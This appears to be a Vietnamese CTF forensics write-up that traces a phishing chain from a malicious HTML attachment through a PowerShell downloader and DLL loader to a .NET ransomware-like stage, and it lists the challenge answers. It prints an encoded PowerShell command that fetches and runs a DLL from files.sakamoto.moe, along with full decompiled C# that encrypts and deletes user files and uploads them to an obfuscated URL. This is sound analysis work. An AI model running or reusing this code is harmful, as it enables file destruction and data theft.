Link download tools:
https://ericzimmerman.github.io/#!index.md
ở domain ngrok thì kiểm tra logs thấy được log lại trong SMBClient nhưng không có thông tin gì thêm
Nhưng ở domain sakamoto.moe thì lại thấy nhiều malicious powershell processes tương tác 
Tại khung thời gian Time Created
2025-08-29 19:48:23
có một lệnh powershell giải mã payload và chạy ngay sau đó
```powershell
powershell -EncodedCommand UABvAHcAZQByAHMASABlAEwAbAAgAC0AIgBlACIAcAAgAEIAIgB5ACIAcABhAHMAcwAgABQgVwAgAGgAIgBpAGQAZAAiAGUAbgAgABUgYwAiAE8ATQAiAG0AYQAgACcAWwBOACIAZQB0AC4AUwBlACIAcgB2ACIAaQAiAGMAZQBQACIAbwAiAGkAbgAiAHQATQAiAGEAIgBuACIAYQAiAGcAIgBlAHIAXQA6ADoAUwAiAGUAIgBjACIAdQByACIAaQAiAHQAeQBQAHIAbwAiAHQAbwAiAGMAbwAiAGwAIAA9ACAAWwBOAGUAIgB0AC4AUwAiAGUAIgBjAHUAcgBpACIAdAAiAHkAIgBQAHIAIgBvAHQAIgBvAGMAIgBvACIAbABUAHkAIgBwAGUAXQA6ADoAVAAiAGwAIgBzACIAMQAyADsAIAAkAHAAIAA9ACAASgBvACIAaQAiAG4ALQBQAGEAIgB0ACIAaAAgACQAZQBuAHYAOgBUAEUATQBQACAAIgBsAC4AZAAiAGwAIgBsACIAOwAgAGkAdwByACAAIgBoACIAdAAiAHQAIgBwACIAcwA6AC8AIgAvAGYAaQAiAGwAZQBzAC4AcwBhAGsAYQAiAG0AIgBvACIAdAAiAG8ALgBtAG8AIgBlAC8ANAAxACIAZAAiAGIAZQA3ACIAYQBjACIANwBiACIANwAzAF8AbABvAGEAZABlAHIALgBkAGwAbAAiACAALQAiAE8AIgB1ACIAdAAiAEYAIgBpACIAbABlACAAJABwADsAIABTACIAdAAiAGEAcgB0AC0AIgBQACIAcgAiAG8AYwBlACIAcwBzACAAcgB1ACIAbgAiAGQAbABsADMAIgAyACIAIAAtAEEAcgBnACIAdQAiAG0AZQAiAG4AIgB0ACIATABpACIAcwB0ACAAIgAkAHAALABSAHUAbgAiACAALQBXACIAYQAiAGkAdAA7ACAAZABlAGwAIAAkAHAAIAAtAEYAIgBvACIAcgBjAGUAJwA=
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep Bypass —W hidden ―cOMma [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $p = Join-Path $env:TEMP l.dll; iwr https://files.sakamoto.moe/41dbe7ac7b73_loader.dll -OutFile $p; Start-Process rundll32 -ArgumentList $p,Run -Wait; del $p -Force
```
truy cập url và tải file dll về check nhanh với virustotal thì đây là một trình giải mã hóa (loader) độc hại với inital access là spearphishing với subtechniques : attachment link -> T1566.001
#### Đáp án câu 1,2,3: 
>Q1: The user opened a software that contained malicious content from the attacker. What was the name of the software?
Ex: Skype
Ans: Thunderbird
Correct!
Q2: What is the name of the file that makes user fall into the attacker's trap?
Ex: example.js
Ans: diemchuan.html
Correct!
Q3: What MITRE ATT&CK techniques did the attacker use?
Ex: T1234.001
Ans: T1566.001
Correct!
#### Stage 2 (Reverse DLL)
Vào hàm Run theo như script powershell chạy với entrypoint khi gọi rundll32
ta thấy nó sẽ gọi hàm FlowAllocation
![stage2](https://hackmd.io/_uploads/r13x2Obqxe.png)
[+] Hàm LoopHook là một hàm decode Xor QWORD với key = 0x5A
[+] IsBufferLoader : Tạo một request URL đã được giải mã từ LoopForHook sử dụng các API của winhttp 
[+] WriteMemcpy là làm đọc dữ liệu trả về từ request và ghi lại vào file Miyamizu_Mitsuha.yourname
[+] RC4 decryption dữ liệu với key là byte_33E154020 (16 bytes)
Tiến hành giải mã dữ liệu ta được lưu vào %TEMP%/steam.exe
Code Xor QWORD
![xor_Qword](https://hackmd.io/_uploads/r1dsZKW5eg.png)
```
https://files.sakamoto.moe/a0f44273e748_steam.enc
```
Kiểm tra thì thấy file vẫn còn được host trên server attack download file và kiểm định với file Miyamizu_Mitsuha.yourname thì giống nhau vậy ta đã xác định được file gốc rồi
dùng key giải mã RC4
vào load vào ILSPY/Dnspy vì check nhanh với die thì nó là một file .NET/C#
#### Đáp án cho câu 4,5,6
>Q4: What is the domain of the website where the malicious file for stage 2 is located?
Ex: mediafire.com
Ans: sakamoto.moe
Correct!
Q5: Digging into the malicious file, what was the original name of the encrypted file that was downloaded?
Ex: payload.enc
Ans: steam.enc
Correct!
Q6: What is the encryption algorithm and key to decrypt the encrypted payload? (Convert it to hex)
Ex: AES_0x1a,0x2b,0x3c,0x4d,...
Ans: RC4_0x3a,0x2d,0x1c,0x4d,0x5e,0x2f,0x7b,0x81,0x3d,0xab,0xbc,0xcd,0xde,0x2f,0xf0,0x01
Correct!
#### Stage 3
```cshap
// minecraft, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// Maicraft.cTIvrRALJgAKjCWOQufOPTJJhWwTDtRCwkk
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using minecraft;

internal class cTIvrRALJgAKjCWOQufOPTJJhWwTDtRCwkk
{
	private static Dictionary<string, string> pdZuVvKNPFSscmrJcOBSJjLEW = new Dictionary<string, string>
	{
		{ "0", "\ud83c\udf7a" },
		{ "1", "\ud83d\ude82" },
		{ "2", "\ud83d\udc0f" },
		{ "3", "⚽" },
		{ "4", "\ud83c\ude3a" },
		{ "5", "⛵" },
		{ "6", "\ud83d\udd3c" },
		{ "7", "\ud83c\udf4d" },
		{ "8", "\ud83c\udfa5" },
		{ "9", "\ud83d\udebe" },
		{ "A", "\ud83d\udc3d" },
		{ "B", "\ud83c\udf0a" },
		{ "C", "\ud83d\udcac" },
		{ "D", "\ud83c\udfad" },
		{ "E", "\ud83c\udf06" },
		{ "F", "\ud83d\udd0e" },
		{ "G", "\ud83d\udc7b" },
		{ "H", "\ud83c\ude51" },
		{ "I", "\ud83d\udc9b" },
		{ "J", "\ud83c\udd7f\ufe0f" },
		{ "K", "\ud83c\uddea\ud83c\uddf8" },
		{ "L", "\ud83d\udc9c" },
		{ "M", "\ud83d\udc36" },
		{ "N", "\ud83c\udf8f" },
		{ "O", "\ud83d\udc60" },
		{ "P", "\ud83c\udf83" },
		{ "Q", "\ud83c\udf75" },
		{ "R", "\ud83d\uddff" },
		{ "S", "\ud83d\udeb9" },
		{ "T", "\ud83d\udd28" },
		{ "U", "\ud83d\udd1c" },
		{ "V", "\ud83d\udcaf" },
		{ "W", "ℹ\ufe0f" },
		{ "X", "\ud83d\udcc9" },
		{ "Y", "\ud83c\ude01" },
		{ "Z", "⏩" },
		{ "a", "9\ufe0f\u20e3" },
		{ "b", "\ud83d\udd01" },
		{ "c", "\ud83d\udcd3" },
		{ "d", "\ud83d\udc23" },
		{ "e", "\ud83d\udc58" },
		{ "f", "\ud83c\udf6f" },
		{ "g", "\ud83d\udcbb" },
		{ "h", "\ud83d\ude8f" },
		{ "i", "\ud83d\udc8b" },
		{ "j", "\ud83c\udfa9" },
		{ "k", "\ud83c\udf63" },
		{ "l", "\ud83d\udc5e" },
		{ "m", "\ud83d\udd38" },
		{ "n", "\ud83c\udf7b" },
		{ "o", "\ud83d\udc9a" },
		{ "p", "\ud83c\udf87" },
		{ "q", "\ud83d\ude9b" },
		{ "r", "\ud83d\udc88" },
		{ "s", "\ud83c\udfc8" },
		{ "t", "\ud83d\ude0d" },
		{ "u", "\ud83d\udeb4" },
		{ "v", "\ud83d\udcbf" },
		{ "w", "\ud83d\udc8f" },
		{ "x", "✒\ufe0f" },
		{ "y", "\ud83c\udf46" },
		{ "z", "\ud83c\udf67" },
		{ "_", "\ud83d\udd52" },
		{ "-", "\ud83d\udc4c" },
		{ "/", "\ud83d\udc2e" },
		{ "+", "\ud83d\udc2d" },
		{ "=", "\ud83d\udd0c" }
	};

	private static void lzzmjArGgUUExMsxcUOqmdCCBrduwURYMq(string outputArchive, params string[] inputFiles)
	{
		string text = string.Join(NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd("\ud83d\udc9b\ud83d\udc3d\ud83d\udd0c\ud83d\udd0c"), inputFiles.Select((string f) => "\"" + f + "\""));
		Process.Start(NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd("\ud83c\udf75\ud83c\udf67\ud83c\udf87\ud83d\udcd3\ud83d\udd1c\ud83c\ude51\ud83c\udd7f\ufe0f\ud83d\udcbf⏩⚽\ud83c\udd7f\ufe0f\ud83d\ude8f\ud83d\udd01\ud83d\udeb9\ud83c\udf0a\ud83d\udc7b9\ufe0f\u20e3ℹ\ufe0f✒\ufe0f\ud83d\udc5e\ud83d\udcd3\ud83d\ude82\ud83d\udc8f⚽\ud83d\udc9c\ud83d\udcaf\ud83c\udf87\ud83c\udf87\ud83d\udcd3\ud83d\udd0e\ud83d\udc8f⚽\ud83d\udc58\ud83d\udc8b⛵\ud83d\udc5e\ud83d\udc58\ud83d\udc7b\ud83d\udd1c\ud83d\udd0c"), "a -t7z -mx5 -parameter-none \"" + outputArchive + "\" " + text)?.WaitForExit();
	}

	private static async Task hVQylKhewOSgWxHuxbNcBpLUQmdgVGemoKmKEvbqat(string filePath)
	{
		using MultipartFormDataContent YIYcePSZHvUeSMhUzZwoVHmOV = new MultipartFormDataContent();
		YIYcePSZHvUeSMhUzZwoVHmOV.Add(new ByteArrayContent(File.ReadAllBytes(filePath)), NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd("⏩\ud83d\udd38\ud83d\udc5e\ud83c\udfc8⏩\ud83c\udf75\ud83d\udd0c\ud83d\udd0c"), Path.GetFileName(filePath));
		HttpClientHandler handler = new HttpClientHandler
		{
			ServerCertificateCustomValidationCallback = HttpClientHandler.DangerousAcceptAnyServerCertificateValidator
		};
		using HttpClient JToIYNnsPTVBGdtYorgktWiMEPfUEkMGMChTBrH = new HttpClient(handler);
		await JToIYNnsPTVBGdtYorgktWiMEPfUEkMGMChTBrH.PostAsync(NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd("9\ufe0f\u20e3\ud83c\ude51\ud83d\uddff\ud83c\udf7a\ud83d\udcd3\ud83c\ude51\ud83d\udc36\ud83d\udd3c\ud83d\udc9c\ud83c\udf46\ud83c\udfa5✒\ufe0f\ud83d\udc60\ud83d\udd28\ud83d\udc9b\ud83d\udeb4\ud83d\udc36\ud83d\udd28\ud83c\ude01\ud83c\ude3a\ud83d\udc9c\ud83c\udfa9\ud83d\udc9b\ud83c\udf7a\ud83c\udf8f\ud83d\udcac\ud83c\ude3a✒\ufe0f\ud83d\udc36\ud83c\udfa9\ud83c\udf63\ud83d\udd3c\ud83c\udf8f\ud83c\udfad\ud83c\udf75\ud83c\udf67\ud83d\udc36\ud83c\udf46\ud83c\udfa5\ud83d\udd0c"), YIYcePSZHvUeSMhUzZwoVHmOV);
	}

	private static byte gbTxSBXvOnHlWXYrw(byte b, int rounds)
	{
		for (int i = 0; i < rounds; i++)
		{
			b = (byte)((uint)((b ^ 0xA5) + 37) & 0xFFu);
		}
		return b;
	}

	private static byte[] TxWVCaCGswNFFkFNyyuGYebzTnmKMI(byte[] plaintext, byte[] key, int rounds = 3)
	{
		byte[] array = new byte[plaintext.Length];
		int num = key.Length;
		for (int i = 0; i < plaintext.Length; i++)
		{
			byte b = gbTxSBXvOnHlWXYrw(key[i % num], rounds);
			array[i] = (byte)(plaintext[i] ^ b);
		}
		return array;
	}

	private static int[] OVixtxAlZgODrcwOVgagxeWAk()
	{
		int[] array = new int[256];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array2 = new byte[1024];
		rNGCryptoServiceProvider.GetBytes(array2);
		Buffer.BlockCopy(array2, 0, array, 0, array2.Length);
		return array;
	}

	private static byte[] qUipnfARjQBaBGtORUDuGAblGcanrkCStJ(string input)
	{
		using SHA256 sHA = SHA256.Create();
		return sHA.ComputeHash(Encoding.UTF8.GetBytes(input));
	}

	private static byte[] lSJNJosACuzaDIkQoaEIkvSckaEPgrBKmY(byte[] data, out byte[] key, out byte[] iv)
	{
		using Aes aes = Aes.Create();
		aes.Mode = CipherMode.CBC;
		aes.Padding = PaddingMode.PKCS7;
		byte[] src = qUipnfARjQBaBGtORUDuGAblGcanrkCStJ(NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd("\ud83c\ude01ℹ\ufe0f⛵\ud83d\udc9a⏩\ud83d\udc7b\ud83d\udd0e\ud83c\udf7a\ud83d\udc23ℹ\ufe0f⛵\ud83c\udf7b\ud83d\udc58ℹ\ufe0f\ud83d\udcaf\ud83d\ude82⏩ℹ\ufe0f\ud83d\ude82\ud83c\udf46\ud83c\ude01\ud83d\udcc9\ud83d\uddff\ud83d\udeb49\ufe0f\u20e3\ud83d\udc7b\ud83d\udc5e\ud83d\udc5e\ud83d\udc23\ud83c\udf75\ud83d\udd0c\ud83d\udd0c"));
		key = new byte[32];
		iv = new byte[16];
		Buffer.BlockCopy(src, 0, key, 0, 32);
		Buffer.BlockCopy(src, 16, iv, 0, 16);
		using ICryptoTransform cryptoTransform = aes.CreateEncryptor(key, iv);
		return cryptoTransform.TransformFinalBlock(data, 0, data.Length);
	}

	private static byte[] ddAxJkAciSG(byte[] data, string publicKey)
	{
		using RSA rSA = RSA.Create();
		rSA.ImportSubjectPublicKeyInfo(Convert.FromBase64String(publicKey), out var _);
		return rSA.Encrypt(data, RSAEncryptionPadding.OaepSHA256);
	}

	private static string eOUFdPmHAHcqPJQRyafSXBf(int length)
	{
		byte[] array = new byte[length];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		rNGCryptoServiceProvider.GetBytes(array);
		StringBuilder stringBuilder = new StringBuilder(length);
		byte[] array2 = array;
		foreach (byte b in array2)
		{
			stringBuilder.Append("KitakitasuruOPQRSTUVWXYZKitakitasuruopqrstuvwxyz"[b % "KitakitasuruOPQRSTUVWXYZKitakitasuruopqrstuvwxyz".Length]);
		}
		return stringBuilder.ToString();
	}

	private static void eLzUcATejKPOKKMlaYnpnwtwzJclOfwjWFRoaxlxd(string[] dirs, string pubKey)
	{
		ISAAC iSAAC = new ISAAC(OVixtxAlZgODrcwOVgagxeWAk());
		byte[] array = new byte[32];
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = (byte)iSAAC.Next();
		}
		byte[] key;
		byte[] iv;
		byte[] bytes = ddAxJkAciSG(lSJNJosACuzaDIkQoaEIkvSckaEPgrBKmY(array, out key, out iv).Concat(key).Concat(iv).ToArray(), pubKey);
		string text = Path.Combine(Path.GetTempPath(), NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd("\ud83d\udd01ℹ\ufe0f\ud83d\udd0e\ud83c\udf87\ud83c\ude01⚽\ud83c\udd7f\ufe0f\ud83d\ude8f⏩\ud83c\udf7b\ud83d\uddff\ud83c\udf6f") + Guid.NewGuid());
		Directory.CreateDirectory(text);
		File.WriteAllBytes(Path.Combine(text, NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd("9\ufe0f\u20e3\ud83d\udc0f\ud83d\udc5e\ud83c\udf7a\ud83c\ude01\ud83d\udeb9⛵\ud83d\udc88⏩\ud83d\udcc9\ud83c\udf63\ud83d\udd0c")), bytes);
		List<string> list = new List<string>();
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
		foreach (string path in dirs)
		{
			string path2 = Path.Combine(folderPath, path);
			if (!Directory.Exists(path2))
			{
				continue;
			}
			string[] files = Directory.GetFiles(path2);
			foreach (string text2 in files)
			{
				list.Add(text2);
				try
				{
					byte[] bytes2 = TxWVCaCGswNFFkFNyyuGYebzTnmKMI(File.ReadAllBytes(text2), array);
					string text3 = eOUFdPmHAHcqPJQRyafSXBf(20);
					File.WriteAllBytes(Path.Combine(Path.GetDirectoryName(text2), text3 + NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd("\ud83d\udc9c\ud83c\udf63\ud83d\udcaf\ud83d\udc9b\ud83c\udf75\ud83d\udc8f\ud83d\udd0c\ud83d\udd0c")), bytes2);
					File.Delete(text2);
					Thread.Sleep(500);
				}
				catch
				{
				}
			}
		}
		File.WriteAllLines(Path.Combine(text, NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd("\ud83d\udd01⚽\ud83c\udd7f\ufe0f\ud83c\udf87⏩\ud83d\udc0f\ud83d\udc5e\ud83d\udeb4\ud83c\ude01ℹ\ufe0f✒\ufe0f\ud83c\udf6f⏩\ud83d\udd38\ud83d\udc5e\ud83c\udfc8⏩\ud83d\udcc9\ud83d\udc36\ud83d\udeb4\ud83d\udc23\ud83c\ude51\ud83d\ude8f\ud83c\udf7a")), list, Encoding.UTF8);
		string text4 = Path.Combine(text, NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd("\ud83d\udcd3\ud83d\udc7b\ud83d\udd0e\ud83c\udfa99\ufe0f\u20e3\ud83d\udc0f\ud83d\udd0e\ud83c\udf7b⏩\ud83d\udeb9\ud83c\ude3a⚽\ud83d\udc58\ud83d\udcbb\ud83d\udd0c\ud83d\udd0c"));
		string[] files2 = Directory.GetFiles(text);
		lzzmjArGgUUExMsxcUOqmdCCBrduwURYMq(text4, files2);
		hVQylKhewOSgWxHuxbNcBpLUQmdgVGemoKmKEvbqat(text4).Wait();
		Thread.Sleep(5000);
		Directory.Delete(text, recursive: true);
	}

	private static void Main()
	{
		string pubKey = NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd("\ud83d\udd28\ud83d\udd1c\ud83d\udc5e\ud83c\udd7f\ufe0f\ud83c\udf75\ud83c\udf63\ud83d\udc5e\ud83d\ude9b\ud83c\udf75\ud83d\udd1c⛵\ud83d\udcac⏩\ud83d\udc0f\ud83d\ude0d✒\ufe0f9\ufe0f\u20e3\ud83d\udc7b\ud83d\ude0d\ud83c\udf87\ud83d\uddff\ud83c\udf67\ud83d\udc5e⚽\ud83d\udc36\ud83c\udf06\ud83c\udd7f\ufe0f\ud83c\udf0a\ud83d\udd1c\ud83d\udd1c\ud83d\udcaf\ud83d\udc7b\ud83c\udf75\ud83d\udd1c\ud83d\udd0e\ud83c\udf83\ud83c\udf75\ud83c\udf7a\ud83d\udd0e\ud83d\uddff\ud83d\udc60\ud83c\udf06\ud83d\udd0e\ud83c\udf8f\ud83d\udeb9\ud83d\udd1c\ud83d\udc5e\ud83d\udcac\ud83c\udf75\ud83d\udc0f\ud83d\udc23\ud83d\udc9c\ud83c\udf75\ud83c\udf7a\ud83d\udd0e\ud83d\uddff\ud83d\uddff\ud83d\udd1c\ud83c\udf06\ud83d\udc8f\ud83d\udd28\ud83d\udd38\ud83d\ude8f\ud83d\ude8f\ud83d\udeb9ℹ\ufe0f\ud83d\udc5e⚽\ud83d\uddff\ud83d\udd1c\ud83d\udd0e\ud83d\udcbf\ud83c\ude01\ud83c\udfa9⏩\ud83d\udcbf\ud83d\udd28\ud83d\udd38\ud83d\ude82✒\ufe0f\ud83d\udd1c\ud83d\udd38\ud83c\udf06\ud83d\ude82\ud83d\udd28\ud83d\udc0f⛵\ud83c\udf83ℹ\ufe0f\ud83d\udd28⏩\ud83c\udf0a\ud83d\udd28\ud83c\udf46\ud83d\ude0d\ud83d\udd1c⏩\ud83c\udfad\ud83c\udd7f\ufe0f\ud83c\ude01\ud83c\udf8f\ud83d\udc0f\ud83d\ude82\ud83c\udf8f⏩\ud83d\udc0f\ud83d\udc23\ud83c\uddea\ud83c\uddf8\ud83c\ude01\ud83c\udf7a\ud83d\udc5e\ud83c\udfa9\ud83d\udeb9\ud83d\udd1c\ud83c\udf7a\ud83c\ude3a\ud83d\udc9c\ud83d\ude82⏩\ud83d\udc8b\ud83d\udc23\ud83c\udfa9\ud83d\udd0e\ud83d\udc0f\ud83d\udd01\ud83c\udf7b\ud83d\udcaf\ud83d\ude8f\ud83c\uddea\ud83c\uddf8⚽\ud83d\udc9a\ud83c\udf67\ud83d\udc36\ud83c\udf7a\ud83d\udd1c✒\ufe0f⏩\ud83c\udf63\ud83d\udd0e\ud83d\udcaf\ud83c\ude01\ud83d\ude82\ud83d\uddff\ud83c\udd7f\ufe0f⏩\ud83d\udcaf\ud83d\uddff\ud83d\udc9b\ud83d\uddff\ud83c\udf06\ud83d\udc5e\ud83c\udf87\ud83d\udd28\ud83d\udcaf\ud83c\udd7f\ufe0f\ud83d\udd28\ud83d\uddff\ud83d\udd28\ud83d\uddff\ud83c\udfad⏩\ud83c\udf06\ud83c\udf8f\ud83c\udf8f\ud83d\udd1c⚽\ud83c\udf63✒\ufe0f\ud83d\uddff\ud83c\udf06\ud83c\udf06\ud83d\udc0f9\ufe0f\u20e3\ud83c\udf7a\ud83d\udcbb\ud83d\udc88\ud83d\udc58\ud83d\udc7b\ud83d\ude8f\ud83d\udc60\ud83c\udf8f\ud83d\ude82\ud83c\udf8f\ud83c\udf67\ud83d\udc60ℹ\ufe0f⛵\ud83d\udc9b\ud83d\udd01\ud83d\udc5e\ud83d\uddff\ud83c\udf06\ud83d\uddff\ud83c\udf63⛵\ud83d\udc9a\ud83d\udd1c\ud83d\udd38\ud83d\udc23\ud83c\udf83\ud83d\udc58\ud83c\udf7b\ud83d\udcaf\ud83d\ude0d\ud83c\udf8f\ud83d\udc0f\ud83c\ude01\ud83c\udf46\ud83d\udc58\ud83c\udf7b\ud83d\udd0e\ud83c\ude51\ud83d\udeb9\ud83d\udd38\ud83d\udebe⚽\ud83d\uddff\ud83d\udcc9⏩\ud83d\udc88⏩\ud83d\udd1c\ud83d\ude0d\ud83d\udc9a\ud83d\udc60\ud83d\udd1c\ud83c\ude3a\ud83d\udc8f\ud83d\udd01\ud83d\udd38\ud83c\udf8f\ud83c\udf67\ud83d\udc23ℹ\ufe0f\ud83d\udc5e\ud83d\ude0d\ud83d\uddff\ud83d\udc7b\ud83c\udf06\ud83c\udf46\ud83c\uddea\ud83c\uddf8\ud83c\udf7a✒\ufe0f\ud83d\udc8f\ud83d\udcaf\ud83d\udd1c\ud83d\uddff\ud83d\udd28\ud83d\udd1c\ud83c\ude51\ud83d\udcbb\ud83d\ude82\ud83d\udc36⚽\ud83d\udc23\ud83c\udd7f\ufe0f\ud83d\udeb9\ud83c\udf63\ud83c\udf63\ud83c\udf67\ud83d\udc58\ud83d\udd0e\ud83d\uddff\ud83d\udd28\ud83d\udcaf\ud83c\ude51\ud83d\uddff\ud83c\udf83⏩\ud83d\udd28\ud83d\uddff\ud83d\udd28⏩\ud83d\udd1c\ud83c\udd7f\ufe0f\ud83d\udd38\ud83d\udc23\ud83c\udfad\ud83d\udc23\ud83c\udf0a\ud83d\udcd3\ud83c\udf63\ud83c\udf06\ud83d\ude82\ud83d\udc58\ud83d\udc7b\ud83d\udcd3\ud83d\udc0f\ud83d\udcaf\ud83d\udcc9\ud83c\udf87\ud83d\udeb4\ud83d\udc9c\ud83d\ude82\ud83d\udc9a\ud83c\udf7a\ud83c\udf75\ud83d\udcc9\ud83d\ude8f\ud83d\ude82\ud83d\udcaf\ud83c\udfa9\ud83c\ude01\ud83c\udf7a\ud83d\uddff\ud83d\udd1c\ud83c\udd7f\ufe0f\ud83d\udcac\ud83d\udc23\ud83d\udcc9\ud83d\udd0e\ud83d\udc9b\ud83c\uddea\ud83c\uddf8\ud83d\udc0f\ud83d\udd0e\ud83c\udf75\ud83d\udeb9\ud83d\udd28\ud83d\udd1c\ud83c\udf67\ud83d\udcaf\ud83c\udfad\ud83d\uddff\ud83d\udcbf\ud83d\udd1c\ud83d\udd1c\ud83d\udc5e\ud83d\udc88\ud83c\udf8f\ud83c\udf63\ud83d\udd0e\ud83d\udd0e\ud83d\udd28\ud83c\ude51\ud83c\udf0a\ud83d\udd38\ud83c\udf75ℹ\ufe0f\ud83c\ude3a\ud83d\ude82\ud83d\udd01\ud83d\udd28\ud83d\udc9b\ud83c\udf46\ud83c\udf75\ud83d\ude82\ud83d\udc9a\ud83c\udf7a\ud83d\udc60\ud83d\udd0e\ud83d\ude8fℹ\ufe0f\ud83d\udcd3\ud83d\udc8b\ud83d\ude0d\ud83c\udf87\ud83d\udd28\ud83c\udf46\ud83d\ude0d\ud83d\ude82\ud83c\udf8f\ud83d\udc0f\ud83d\ude8f\ud83c\uddea\ud83c\uddf8\ud83d\udcd3\ud83c\udf06\ud83d\uddff\ud83d\udd28\ud83d\udc23\ud83c\udf63\ud83d\ude82\ud83d\udc9c\ud83d\udcaf\ud83d\udc7b\ud83d\ude82\ud83c\ude51\ud83c\udf8f\ud83c\udf67\ud83d\udc5e⛵9\ufe0f\u20e3\ud83c\udfad\ud83d\udc23\ud83c\udf7b\ud83d\udd01ℹ\ufe0f\ud83d\udc23\ud83d\udc7b⏩⚽\ud83d\udc23\ud83c\udf0a\ud83d\udd28\ud83d\udd1c\ud83d\udc8f⚽\ud83c\ude01\ud83d\ude82\ud83c\udf8f\ud83d\udc9b\ud83d\udeb9\ud83d\udd0e\ud83d\uddff\ud83c\udf8f⏩\ud83d\udcaf\ud83c\udf0aℹ\ufe0f9\ufe0f\u20e3\ud83d\udcaf\ud83d\udc5e\ud83d\udcbf9\ufe0f\u20e3\ud83c\udf67\ud83d\udd0e\ud83d\udd28\ud83d\udd1c⚽\ud83d\udcaf\ud83d\udc88\ud83d\udeb9\ud83d\udc7b\ud83d\udcaf\ud83d\udeb9⏩\ud83c\udf06\ud83d\udcaf\ud83d\ude8f\ud83d\uddff\ud83d\udd38\ud83c\udfc8\ud83c\ude3a\ud83d\udd28\ud83d\udd28⏩\ud83d\ude8f9\ufe0f\u20e3\ud83d\udd1c\ud83d\udcaf✒\ufe0fℹ\ufe0fℹ\ufe0f\ud83d\udc36⚽\ud83d\udc9c\ud83c\udf7a\ud83d\udd0e\ud83c\udfa9\ud83d\udcaf\ud83d\ude82\ud83c\udf8f\ud83d\udeb4\ud83d\udeb9\ud83d\udc7b\ud83d\udcaf\ud83c\ude01\ud83d\udcd3\ud83d\udd0e\ud83d\ude8f\ud83c\uddea\ud83c\uddf8\ud83d\udd28\ud83d\udd38⏩\ud83d\udd0e\ud83d\uddffℹ\ufe0f\ud83c\udf8f\ud83c\udfad\ud83d\udd28\ud83c\ude51\ud83d\udcaf\ud83c\udfad\ud83d\udcd3\ud83d\udd1c⛵\ud83d\ude9b\ud83c\udf8f\ud83d\udc0f⏩\ud83c\udfa9\ud83d\udcaf\ud83c\udfad\ud83d\udc9b\ud83d\ude82⏩\ud83d\udc0f\ud83d\ude82\ud83d\udd0e\ud83d\udc23\ud83c\udf7a\ud83d\udcd3\ud83d\ude82\ud83d\udd01\ud83d\udd0e\ud83d\udc5e\ud83c\udfa9ℹ\ufe0fℹ\ufe0f\ud83c\udf87\ud83d\udc88\ud83c\udf8f\ud83d\udcc9\ud83c\udf87\ud83c\udf7b\ud83d\udd01\ud83d\udd0e\ud83c\udf0a\ud83d\udd38\ud83c\uddea\ud83c\uddf8\ud83d\udc0f\ud83d\ude0d\ud83c\uddea\ud83c\uddf8\ud83d\udc36\ud83d\udd0e\ud83d\udd0e\ud83c\udd7f\ufe0f\ud83d\uddff\ud83c\udf06\ud83d\udd0e\ud83d\uddff\ud83c\udf75\ud83d\udd1c\ud83d\udc9b\ud83d\udd0c");
		eLzUcATejKPOKKMlaYnpnwtwzJclOfwjWFRoaxlxd(new string[5]
		{
			NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd("\ud83d\uddff\ud83d\udc7b\ud83d\udebe\ud83c\udfa9\ud83d\udc23ℹ\ufe0f\ud83d\ude82\ud83d\udc5e\ud83d\udd01\ud83c\udf7b\ud83d\uddff\ud83c\udf67"),
			NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd("\ud83d\udcaf\ud83d\udd38\ud83d\udc5e\ud83c\udf63⏩ℹ\ufe0f\ud83d\udebe\ud83c\udf67"),
			NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd("\ud83d\udd1c\ud83d\udc7b\ud83d\udc5e\ud83c\udfa9\ud83d\udc23\ud83c\ude51\ud83d\udcaf\ud83c\udf46⏩\ud83d\udcc9\ud83d\udc36\ud83d\udd0c"),
			NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd("\ud83d\udd28\ud83d\udcc9\ud83d\udcaf\ud83c\udf679\ufe0f\u20e3ℹ\ufe0f\ud83d\udc36\ud83d\udd0c"),
			NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd("\ud83d\uddff\ud83d\udc7b\ud83d\udcaf\ud83c\udf679\ufe0f\u20e3⚽\ud83d\uddff\ud83d\udcbf\ud83d\udcd3\ud83d\udc3d\ud83d\udd0c\ud83d\udd0c")
		}, pubKey);
	}

	private static string NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd(string java)
	{
		string text = null;
		StringInfo stringInfo = new StringInfo(java);
		for (int i = 0; i < stringInfo.LengthInTextElements; i++)
		{
			string text2 = stringInfo.SubstringByTextElements(i, 1);
			foreach (KeyValuePair<string, string> item in pdZuVvKNPFSscmrJcOBSJjLEW)
			{
				if (item.Value == text2)
				{
					text += item.Key.ToString();
				}
			}
		}
		return Encoding.UTF8.GetString(Convert.FromBase64String(text));
	}
}
```
Chương trình sử dụng kỹ thuật mã hóa emoji với một cái dictionary dùng mapping về lại ASCII 
Đây là code mapping lại chuỗi escape/emoji
